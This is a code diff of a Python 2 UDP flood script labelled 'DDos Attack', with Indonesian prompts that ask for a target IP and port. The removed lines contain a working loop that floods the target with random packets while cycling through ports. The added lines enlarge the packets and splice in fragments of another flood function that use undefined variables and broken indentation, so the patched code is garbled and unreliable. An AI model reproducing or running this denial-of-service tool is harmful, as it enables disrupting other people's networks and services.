@@ -3,7 +3,7 @@ import os
 import time
 import socket
 import random
-#Code Time
+#Kode Untuk Waktu
 from datetime import datetime
 now = datetime.now()
 hour = now.hour
@@ -12,13 +12,12 @@ day = now.day
 month = now.month
 year = now.year
 
-##############
+
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+bytes = random._urandom(20000)
 
 os.system("clear")
-os.system("figlet DDos Attack")
+
 print
 print "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
 print "| Author   : InYourHeart                  |"
@@ -27,25 +26,37 @@ print "| Github   : https://github.com/2EASY4HACK|"
 print "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+"
 print
 ip = raw_input("Masukan IP target : ")
-port = input("Port       : ")
+port = input("Masukan Port Target: ")
 
 os.system("clear")
-os.system("figlet Attack Starting")
+print "Mohon Tunggu"
 print "[                    ] 0% "
-time.sleep(5)
+time.sleep(1)
 print "[=====               ] 25%"
-time.sleep(5)
+time.sleep(1)
 print "[==========          ] 50%"
-time.sleep(5)
+time.sleep(1)
 print "[===============     ] 75%"
-time.sleep(5)
+time.sleep(1)
 print "[====================] 100%"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Mengirim %s Paket %s Ke Target:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+time.sleep(1)
+ bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+ while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+           print "\033[1;91mMemulai \033[1;32m%s \033[1;91mmengirim paket \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
